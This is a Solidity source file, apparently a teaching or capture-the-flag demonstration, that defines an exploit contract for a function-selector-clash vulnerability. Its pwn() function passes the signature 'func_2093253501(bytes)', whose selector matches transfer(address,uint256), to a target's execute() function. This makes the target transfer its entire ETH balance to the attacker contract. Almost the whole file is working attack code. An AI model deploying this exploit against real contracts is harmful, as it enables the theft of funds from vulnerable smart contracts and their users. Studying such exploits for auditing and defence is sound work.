// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IFunctionSelectorClash {
    function execute(string calldata _func, bytes calldata _data) external;
}

contract FunctionSelectorClashExploit {
    address public immutable target;

    constructor(address _target) {
        target = _target;
    }

    // Receive ETH from target
    receive() external payable {}

    function pwn() external {
        // Both "transfer(address,uint256)" and "func_2093253501(bytes)"
        // have the same function selector
        // 0xa9059cbb
        IFunctionSelectorClash _target = IFunctionSelectorClash(target);
        _target.execute(
            "func_2093253501(bytes)",
            abi.encode(
                address(this),
                address(_target).balance
            )
        );
    }
}